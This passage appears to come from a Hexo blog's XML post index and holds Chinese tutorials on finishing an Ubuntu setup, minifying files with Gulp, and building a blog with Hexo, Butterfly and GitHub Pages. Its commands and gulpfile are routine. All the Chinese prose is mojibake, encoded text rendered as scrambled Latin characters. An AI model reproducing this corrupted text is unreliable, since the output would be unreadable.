src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fwx8IG4c9DQqa2b.png" alt="image-20210215020740306"></p><p>é€‰å¥½åè¾“å…¥å¯†ç ï¼Œç‚¹å‡» Closeï¼Œåƒä¸‡åˆ«ç‚¹ Revert</p><p>åˆ°æ­¤æ›´æ¢å®Œæˆã€‚</p><blockquote><p>åŸºæœ¬é…ç½®å¼„å¥½åï¼Œå°±å¯ä»¥å°½æƒ…äº«ç”¨ Ubuntu ï¼</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gulpå‹ç¼©åˆä½“éªŒ</title>
      <link href="posts/175.html"/>
      <url>posts/175.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote><p><a href="http://gulpjs.com/">Gulp</a>  æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–æ„å»ºå·¥å…·ï¼Œå¼€å‘è€…å¯ä»¥ä½¿ç”¨å®ƒåœ¨é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­è‡ªåŠ¨æ‰§è¡Œå¸¸è§ä»»åŠ¡ã€‚</p></blockquote><ul><li>æ­å»ºwebæœåŠ¡å™¨</li><li>æ–‡ä»¶ä¿å­˜æ—¶è‡ªåŠ¨é‡è½½æµè§ˆå™¨</li><li>ä½¿ç”¨é¢„å¤„ç†å™¨å¦‚Sassã€LESS</li><li>ä¼˜åŒ–èµ„æºï¼Œæ¯”å¦‚å‹ç¼©CSSã€JavaScriptã€å‹ç¼©å›¾ç‰‡</li></ul><p>å½“ç„¶Gulpèƒ½åšçš„è¿œä¸æ­¢è¿™äº›ã€‚è¿™é‡Œä¹Ÿåªæ˜¯ç®€å•åˆ©ç”¨å®ƒæ¥å‹ç¼©html,css,jsæ–‡ä»¶ï¼Œä¸€å®šç¨‹åº¦ä¸Šå‡ç¼“ç«™ç‚¹åŠ è½½è¿‡æ…¢çš„é—®é¢˜ã€‚</p><h1 id="Gulpçš„å®‰è£…"><a href="#Gulpçš„å®‰è£…" class="headerlink" title="Gulpçš„å®‰è£…"></a>Gulpçš„å®‰è£…</h1><p>é¦–å…ˆç¡®ä¿å·²ç»æ­£ç¡®å®‰è£…äº†node.jsç¯å¢ƒï¼Œç„¶åä»¥å…¨å±€æ–¹å¼å®‰è£…gulpï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g gulp</span><br></pre></td></tr></table></figure><p>å…¨å±€å®‰è£…gulpåï¼Œè¿˜éœ€è¦åœ¨æ¯ä¸ªè¦ä½¿ç”¨gulpçš„é¡¹ç›®ä¸­éƒ½å•ç‹¬å®‰è£…ä¸€æ¬¡ã€‚æŠŠç›®å½•åˆ‡æ¢åˆ°ä½ çš„é¡¹ç›®æ–‡ä»¶å¤¹ä¸­ï¼Œç„¶ååœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev gulp  // --save-devç”¨äºæŠŠgulpå†™è¿›é¡¹ç›®package.jsonæ–‡ä»¶çš„ä¾èµ–ä¸­</span><br></pre></td></tr></table></figure><h1 id="Gulpçš„ä½¿ç”¨"><a href="#Gulpçš„ä½¿ç”¨" class="headerlink" title="Gulpçš„ä½¿ç”¨"></a>Gulpçš„ä½¿ç”¨</h1><h2 id="å»ºç«‹gulpfile-jsæ–‡ä»¶"><a href="#å»ºç«‹gulpfile-jsæ–‡ä»¶" class="headerlink" title="å»ºç«‹gulpfile.jsæ–‡ä»¶"></a>å»ºç«‹gulpfile.jsæ–‡ä»¶</h2><p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶åä¸º<code>gulpfile.js</code>çš„æ–‡ä»¶ï¼Œä¹‹åè¦åšçš„äº‹æƒ…å°±æ˜¯åœ¨<code>gulpfile.js</code>æ–‡ä»¶ä¸­å®šä¹‰æˆ‘ä»¬çš„ä»»åŠ¡äº†ã€‚ä¸‹é¢æ˜¯è¿™æ¬¡çš„ <code>gulpfile.js</code> æ–‡ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">&#x27;gulp-uglify&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> minifyCSS = <span class="built_in">require</span>(<span class="string">&#x27;gulp-minify-css&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlminify = <span class="built_in">require</span>(<span class="string">&#x27;gulp-html-minify&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‹ç¼©js</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-js&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"> <span class="keyword">return</span> gulp.src(<span class="string">&#x27;./*.js&#x27;</span>) </span><br><span class="line"> .pipe(uglify())</span><br><span class="line"> .pipe(gulp.dest(<span class="string">&#x27;./&#x27;</span>)) </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‹ç¼©css</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-css&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> gulp.src(<span class="string">&#x27;./*.css&#x27;</span>)</span><br><span class="line"> .pipe(minifyCSS())</span><br><span class="line"> .pipe(gulp.dest(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‹ç¼©html</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">&#x27;./*.html&#x27;</span>)</span><br><span class="line">    .pipe(htmlminify())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>API</p><ul><li>gulp.task(â€˜nameâ€™, function(){})    å®šä¹‰ä»»åŠ¡</li><li>gulp.src(â€˜pathâ€™)    ä»è¯¥è·¯å¾„è¯»å–è¦è¢«å‹ç¼©çš„æ–‡ä»¶</li><li>gulp.dest(â€˜pathâ€™)    æŠŠå‹ç¼©åçš„æ–‡ä»¶å†™å…¥è¯¥è·¯å¾„</li></ul><h2 id="å®‰è£…gulpæ’ä»¶"><a href="#å®‰è£…gulpæ’ä»¶" class="headerlink" title="å®‰è£…gulpæ’ä»¶"></a>å®‰è£…gulpæ’ä»¶</h2><p>è¿™é‡Œéœ€è¦å®‰è£…</p><ul><li>gulp-uglify  ç”¨äºå‹ç¼©jsæ–‡ä»¶å¤§å°</li><li>gulp-minify-css  ç”¨äºå‹ç¼©cssæ–‡ä»¶å¤§å°</li><li>gulp-html-minify  ç”¨äºå‹ç¼©htmlæ–‡ä»¶å¤§å°</li></ul><h2 id="è¿è¡Œgulpä»»åŠ¡"><a href="#è¿è¡Œgulpä»»åŠ¡" class="headerlink" title="è¿è¡Œgulpä»»åŠ¡"></a>è¿è¡Œgulpä»»åŠ¡</h2><p>æ’ä»¶å®‰è£…å®Œæˆå,ä½¿ç”¨ <code>gulp</code> åé¢å¯ä»¥åŠ ä¸Šè¦æ‰§è¡Œçš„ä»»åŠ¡åï¼Œä¾‹å¦‚<code>gulp task1</code>ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šä»»åŠ¡åï¼Œåˆ™ä¼šæ‰§è¡Œä»»åŠ¡åä¸º<code>default</code>çš„é»˜è®¤ä»»åŠ¡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gulp task_name</span><br></pre></td></tr></table></figure><h1 id="Gulpä½¿ç”¨å‰å"><a href="#Gulpä½¿ç”¨å‰å" class="headerlink" title="Gulpä½¿ç”¨å‰å"></a>Gulpä½¿ç”¨å‰å</h1><p>å‹ç¼©å‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/RXSA3Ob6CdPxvn1.png" alt="image-20210131230716274"></p><p>å‹ç¼©ä¸­</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/EMfnGihjT3N19z6.png" alt="image-20210131231014617"></p><p>å‹ç¼©å</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Aw4k1GNKv2n67Zh.png" alt="image-20210131231059152"></p><p>è¿™é‡Œåˆæ¬¡çª¥è§äº†gulpçš„å¼ºå¤§~~</p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><blockquote><p>gulpçš„åŠŸèƒ½è¿˜æœ‰å¾ˆå¤šï¼Œä¹Ÿååˆ†ä¾¿æ·é«˜æ•ˆã€‚æ­¤ç•ªå°è¯•ç‰›åˆ€ï¼Œæ›´å¾…æ—¥åæ¢ç´¢ã€‚ã€‚ã€‚</p><p>æœ€åï¼Œé™„ä¸ŠButterflyä¸»é¢˜ä½œè€…å…³äºGulpå‹ç¼©çš„æ•™ç¨‹ï¼Œä¸€ä¸ª <code>gulp </code> å‘½ä»¤è½»æ¾å®Œæˆæ–‡ä»¶å‹ç¼©ï¼</p><p><a href="https://butterfly.js.org/posts/4073eda/#Gulp%E5%A3%93%E7%B8%AE">https://butterfly.js.org/posts/4073eda/#Gulp%E5%A3%93%E7%B8%AE</a></p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://www.jianshu.com/p/a9e7838c8043">gulp åŠå…¶å¸¸ç”¨æ’ä»¶</a></p><p>[2] <a href="https://www.cnblogs.com/2050/p/4198792.html">å‰ç«¯æ„å»ºå·¥å…·gulpjsçš„ä½¿ç”¨ä»‹ç»åŠæŠ€å·§</a></p><p>[3] <a href="https://blog.csdn.net/weixin_33929309/article/details/86069162?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">Gulpæ–°æ‰‹å…¥é—¨æ•™ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gulp </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ªäººåšå®¢æ­å»ºè®°å½• Hexo+Butterfly+Github Page+Coding</title>
      <link href="posts/50074.html"/>
      <url>posts/50074.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å…¶å®æˆ‘ä¸€ç›´æœ‰æ­å»ºåšå®¢çš„æƒ³æ³•ï¼Œä½†ç›´åˆ°ä»Šå¤©æ‰å¼€é€šäº†è¿™ä¸ªåšå®¢ï¼Œè¿˜æ˜¯åˆ©ç”¨ä¸Šå‡æœŸçš„é—²å·¥å¤«ã€‚åœ¨å¤§ä½¬ä»¬åšæ–‡çš„å¸®åŠ©ä¸‹ï¼Œå°ç«™åˆå…·æ¨¡æ ·ï¼Œè¿™é‡Œå¯¹ä»–ä»¬è‡´ä»¥ä¸‡åˆ†æ„Ÿè°¢ã€‚ä¸‹é¢å°±æ­å»ºè¿‡ç¨‹è¿›è¡Œç®€å•è®°å½•ã€‚</p><h1 id="å‰æå‡†å¤‡"><a href="#å‰æå‡†å¤‡" class="headerlink" title="å‰æå‡†å¤‡"></a>å‰æå‡†å¤‡</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ul><li><a href="https://hexo.io/zh-cn/">Hexo</a> æ˜¯ä¸€æ¬¾åŸºäº Node.js ç”¨äºå¿«é€Ÿæ­å»ºåšå®¢çš„æ¡†æ¶ï¼Œæœ‰äº†å®ƒå°±å¯ä»¥å®Œæˆå®Œæˆä¸ªäººåšå®¢çš„æ„å»ºï¼Œå®ƒä¼šå¸®ä½ æ„å»ºåšå®¢çš„æ•´ä¸ªæ¡†æ¶ï¼Œä½ åªéœ€è¦ä¼šä½¿ç”¨Markdown å†™åšå®¢å³å¯ã€‚å…³äºHexoçš„å…·ä½“ä»‹ç»ï¼Œå¯ä»¥åœ¨å…¶å®˜æ–¹ç½‘ç«™æŸ¥çœ‹å…·ä½“çš„è¯´æ˜ã€‚</li><li><a href="https://butterfly.js.org/">Butterfly</a> åšå®¢ä¸»é¢˜ã€‚A Simple and Card UI Design theme for Hexo.</li><li><a href="https://help.github.com/en/articles/what-is-github-pages">Github Page</a> æ˜¯ Github æä¾›çš„é™æ€ç½‘ç«™æ‰˜ç®¡æœåŠ¡ï¼Œå¯ä» Github ä»“åº“ä¸­å±•ç¤ºä½ çš„ä¸ªäººã€ç»„ç»‡æˆ–è€…é¡¹ç›®çš„é™æ€ç½‘é¡µã€‚ä½ å¯ä»¥é€‰æ‹©ä½¿ç”¨ Github Pages å…è´¹æä¾›çš„åŸŸå github.io æˆ–è€…è‡ªå·±è´­ä¹°åŸŸåæ¥å‘å¸ƒç«™ç‚¹ï¼Œç«™ç‚¹å¯ä»¥è¢«å…è´¹æ‰˜ç®¡åœ¨ Github ä¸Šã€‚ä½¿ç”¨Github Pageså¯ä»¥ä¸ºä½ æä¾›ä¸€ä¸ªå…è´¹çš„æœåŠ¡å™¨ï¼Œå…å»äº†è‡ªå·±æ­å»ºæœåŠ¡å™¨å’Œå†™æ•°æ®åº“çš„éº»çƒ¦ã€‚</li><li><a href="https://coding.net/">Codiing</a> æ˜¯ä¸€ç«™å¼è½¯ä»¶ç ”å‘ç®¡ç†åä½œå¹³å°ï¼Œæä¾› Git/SVN ä»£ç æ‰˜ç®¡ã€é¡¹ç›®ååŒã€æµ‹è¯•ç®¡ç†ç­‰å·¥å…·ï¼Œå°†åšå®¢æ‰˜ç®¡åœ¨codingä¸Šï¼Œå¯æé«˜å›½å†…è®¿é—®åšå®¢çš„é€Ÿåº¦ã€‚</li><li><a href="https://git-scm.com/">Git</a> æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼ˆæ²¡æœ‰ä¹‹ä¸€ï¼‰ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨git bash å®Œæˆå®‰è£…ï¼Œåˆå§‹åŒ–ï¼Œä¸Šä¼ ç­‰æ“ä½œã€‚</li><li><a href="https://nodejs.org/zh-cn/">node.js</a> æ˜¯ä¸€ä¸ªåŸºäºChrome V8å¼•æ“çš„JavaScriptè¿è¡Œç¯å¢ƒã€‚å®‰è£…å¥½node.jsååˆ©ç”¨npmåŒ…ç®¡ç†å·¥å…·æ¥å®‰è£…Hexo</li></ul><h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><p>åœ¨windows10ç³»ç»Ÿä¸‹ï¼Œå‰å¾€<a href="https://git-scm.com/">Git</a>å®˜ç½‘ä¸‹è½½ï¼Œå®‰è£…ã€‚å…¶ä»–ç³»ç»Ÿä¸‹çš„Gitå®‰è£…æ–¹æ³•å¯åœ¨<a href="https://hexo.io/zh-cn/docs/">hexoçš„æ–‡æ¡£</a>ä¸­æŸ¥é˜…ã€‚</p><p>å®‰è£…æ­£ç¡®çš„è¯ï¼Œåœ¨æ¡Œé¢æˆ–æ–‡ä»¶å¤¹ç©ºç™½å¤„é¼ æ ‡å³é”®èœå•ä¼šæ–°å¢â€œGit GUI Hereâ€å’Œâ€œGit Bash Hereâ€ä¸¤ä¸ªé€‰é¡¹ã€‚</p><p>Git å¸¸ç”¨å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone -b &lt;branch&gt; https://github.com/xxxx/xxxx.git</span><br><span class="line">git pull</span><br><span class="line">git add .</span><br><span class="line">git commit -m &#x27;comment&#x27;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…node-js"><a href="#å®‰è£…node-js" class="headerlink" title="å®‰è£…node.js"></a>å®‰è£…node.js</h2><p>å‰å¾€<a href="https://nodejs.org/zh-cn/">node.jså®˜ç½‘</a> é€‰æ‹©é•¿æœŸæ”¯æŒç‰ˆæœ¬çš„node.jsä¸‹è½½ï¼Œé»˜è®¤è·¯å¾„å®‰è£…å³å¯ã€‚</p><p>åœ¨cmdä¸­è¾“å…¥å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm --version</span><br></pre></td></tr></table></figure><p>å‡ºç°ç‰ˆæœ¬ä¿¡æ¯åˆ™è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p><h2 id="å®‰è£…Hexo"><a href="#å®‰è£…Hexo" class="headerlink" title="å®‰è£…Hexo"></a>å®‰è£…Hexo</h2><p>å®Œæˆå‰ä¸¤ä¸ªåº”ç”¨çš„å®‰è£…åï¼Œå³å¯ä½¿ç”¨npmå®‰è£…Hexo</p><p>åœ¨æ¡Œé¢ç©ºç™½å¤„å•å‡»å³é”®ï¼Œæ‰“å¼€git bashï¼Œè¾“å…¥Hexoå®‰è£…å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>å› ä¸ºnpmæ˜¯ä»å›½å¤–æœåŠ¡å™¨ä¸‹è½½ï¼Œå¯èƒ½å‡ºç°å¼‚å¸¸ï¼Œé€Ÿåº¦æ…¢ç­‰é—®é¢˜ï¼Œæ‰€ä»¥æœ‰æ›´å¥½çš„é€‰æ‹©</p><p><strong><a href="https://developer.aliyun.com/mirror/NPM?from=tnpm">æ·˜å®NPMé•œåƒ</a></strong></p><p>è¿™æ˜¯ä¸€ä¸ªå®Œæ•´ <code>npmjs.org</code> é•œåƒï¼Œä½ å¯ä»¥ç”¨æ­¤ä»£æ›¿å®˜æ–¹ç‰ˆæœ¬(åªè¯»)ï¼ŒåŒæ­¥é¢‘ç‡ç›®å‰ä¸º <strong>10åˆ†é’Ÿ</strong> ä¸€æ¬¡ä»¥ä¿è¯å°½é‡ä¸å®˜æ–¹æœåŠ¡åŒæ­¥ã€‚</p><p>å…¶å®‰è£…å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install cnpm -g --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯ä»¥ä½¿ç”¨å…¶å®šåˆ¶çš„ <a href="https://github.com/cnpm/cnpm">cnpm</a> (gzip å‹ç¼©æ”¯æŒ) å‘½ä»¤è¡Œå·¥å…·ä»£æ›¿é»˜è®¤çš„ <code>npm</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>ä¸‹è½½é€Ÿåº¦å¿«äº†ä¸å°‘æœ‰æ²¡æœ‰</p><p>æ£€æŸ¥Hexoæ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>å‡ºç°ç‰ˆæœ¬ä¿¡æ¯åˆ™è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p><p>å®‰è£…å¥½ä»¥åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ‰§è¡Œ Hexoï¼š</p><ol><li><code>npx hexo &lt;command&gt;</code></li><li>å°† Hexo æ‰€åœ¨çš„ç›®å½•ä¸‹çš„ <code>node_modules</code> æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¹‹ä¸­å³å¯ç›´æ¥ä½¿ç”¨ <code>hexo &lt;command&gt;</code></li></ol><h1 id="æ­å»ºå·¥ä½œ"><a href="#æ­å»ºå·¥ä½œ" class="headerlink" title="æ­å»ºå·¥ä½œ"></a>æ­å»ºå·¥ä½œ</h1><h2 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><p>è¿™é‡Œåœ¨Eç›˜ä¸‹æ–°å»ºä¸€ä¸ªç›®å½•<code> Blog</code>,ç”¨æ¥å­˜æ”¾ç›¸å…³æ–‡ä»¶ã€‚åœ¨æ­¤å¤„æ‰“å¼€ <code>Git Bash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šè‹¥æ²¡æœ‰æŠŠHexoæ·»åŠ åˆ°ç¯å¢ƒå˜é‡ï¼Œåœ¨æ‰€æœ‰å‘½ä»¤ä¸­çš„ <code>hexo</code> å‰éƒ½è¦åŠ ä¸Š <code>npx</code></p></blockquote><p>å‘½ä»¤æ‰§è¡Œå®Œæˆåï¼Œå°†åœ¨E:\Blog\ä¸‹ç”Ÿæˆç›¸åº”çš„æ–‡ä»¶ï¼Œç›®å½•å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/FAnR3pHMTsYbeaL.png" alt="image-20210130221733932"></p><p>ä¸»è¦å…³æ³¨çš„æ˜¯ï¼š</p><ul><li>_config.yml , é…ç½®æ–‡ä»¶ï¼Œåœ¨æ­¤é…ç½®å¤§éƒ¨åˆ†å‚æ•°</li><li>source/_posts , å­˜æ”¾mdæ–‡ä»¶</li><li>themes , ä¸»é¢˜æ–‡ä»¶å¤¹</li></ul><h2 id="ç”Ÿæˆé™æ€é¡µé¢-æœ¬åœ°"><a href="#ç”Ÿæˆé™æ€é¡µé¢-æœ¬åœ°" class="headerlink" title="ç”Ÿæˆé™æ€é¡µé¢(æœ¬åœ°)"></a>ç”Ÿæˆé™æ€é¡µé¢(æœ¬åœ°)</h2><p>å¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤ç”Ÿæˆé™æ€é¡µé¢:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>å®Œæˆåä¼šåœ¨æ ¹ç›®å½•E:\Blog\ä¸‹ç”Ÿæˆpublicæ–‡ä»¶å¤¹ï¼Œé‡Œé¢åŒ…å«ç›¸åº”çš„htmlé¡µé¢ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1sKW7qJ9gkxTCfc.png" alt="image-20210130222715240"></p><h2 id="å¯åŠ¨æœåŠ¡å™¨-æœ¬åœ°"><a href="#å¯åŠ¨æœåŠ¡å™¨-æœ¬åœ°" class="headerlink" title="å¯åŠ¨æœåŠ¡å™¨(æœ¬åœ°)"></a>å¯åŠ¨æœåŠ¡å™¨(æœ¬åœ°)</h2><p>å¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯åŠ¨æœåŠ¡å™¨:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>è¿™æ¡æŒ‡ä»¤è¿è¡Œå®Œæˆåå¯åœ¨æœ¬åœ°å¯åŠ¨æœåŠ¡å™¨å¹¶é¢„è§ˆåšå®¢ï¼Œé»˜è®¤ç½‘å€ä¸º<code>http://localhost:4000/</code>ã€‚<br>å¦‚æœä»¥ä¸Šæ­¥éª¤éƒ½ä¸å‡ºæ„å¤–çš„è¯ï¼Œä½ å°±ä¼šçœ‹åˆ°ä¸€ä¸ªHexoåšå®¢åˆå§‹åŒ–çš„é¡µé¢ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/YTqGb8ipVjBWQCv.png"></p><h1 id="æ›´æ¢ä¸»é¢˜"><a href="#æ›´æ¢ä¸»é¢˜" class="headerlink" title="æ›´æ¢ä¸»é¢˜"></a>æ›´æ¢ä¸»é¢˜</h1><p>é»˜è®¤çš„ä¸»é¢˜å¯èƒ½å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ›´æ¢ä¸»é¢˜æ¥å®ç°ã€‚å¯ä»¥åœ¨<a href="https://hexo.io/themes/">Heoxå®˜ç½‘çš„ä¸»é¢˜é¡µé¢</a>é€‰æ‹©æƒ³è¦çš„ä¸»é¢˜ã€‚è¿™é‡Œï¼Œé€‰æ‹©Butterflyä¸»é¢˜ã€‚æ„Ÿè°¢å¼€æºæ­¤ä¸»é¢˜çš„å„ä½å¤§ä½¬ä»¬ï¼Œè®©æˆ‘ç”¨ä¸Šäº†è¿™ä¹ˆå¥½çš„é¡µé¢ã€‚</p><p>Butterflyä¸»é¡µçš„å±•ç¤ºé¡µé¢ï¼š<a href="https://jerryc.me/">https://jerryc.me</a> </p><p>è¯¦ç»†çš„å®‰è£…æ–‡æ¡£çš„åœ°å€ä¸ºï¼š<a href="https://jerryc.me/posts/21cfbf15">https://jerryc.me/posts/21cfbf15</a></p><p>Githubåœ°å€ï¼š<a href="https://github.com/jerryc127/hexo-theme-butterfly">https://github.com/jerryc127/hexo-theme-butterfly</a></p><p>æ ¹æ®æ–‡æ¡£è¯´æ˜ç›´æ¥é…ç½®ä¸»é¢˜å³å¯ï¼Œè¿™é‡Œç®€å•è®°å½•å¦‚ä¸‹ï¼š</p><blockquote><p>Butterflyä¸»é¢˜å®‰è£…</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure><blockquote><p>åº”ç”¨ä¸»é¢˜</p></blockquote><p>ä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶<code>_config.yml</code>ï¼ŒæŠŠä¸»é¢˜æ”¹ä¸º<code>butterfly</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><p>ä¸ºæ–¹ä¾¿åç»­è®¾ç½®ï¼Œè¿™é‡ŒæŠŠ<code>butterfly</code> ç›®å½•ä¸‹çš„ <code>_config.yml</code> é…ç½®æ–‡ä»¶å¤åˆ¶åˆ° <code>Blog</code> ç›®å½•ä¸‹ï¼Œå¹¶é‡æ–°å‘½åä¸º <code>_config.butterfly.yml</code>ã€‚ä»¥åå¯¹ä¸»é¢˜çš„ç›¸å…³è®¾ç½®åªéœ€è¦åœ¨ <code>_config.butterfly.yml</code>è¿›è¡Œé…ç½®å°±è¡Œã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/bv2jmdBIiKNf7WF.png" alt="image-20210130122459017"></p><blockquote><p>å®‰è£…ç›¸å…³æ’ä»¶</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>åœ¨å®‰è£…ï¼Œåº”ç”¨ä¸»é¢˜æ—¶é‡åˆ°çš„é—®é¢˜å¯åœ¨bufferflyçš„å®‰è£…æ–‡æ¡£ä¸­æŸ¥é˜…ã€‚</p><p>åœ¨ä¸€å®šä¿®æ”¹åé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹åº”ç”¨ä¸»é¢˜åçš„åˆæ­¥æ•ˆæœ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  #æ¸…æ¥šç¼“å­˜æ–‡ä»¶</span><br><span class="line">hexo g  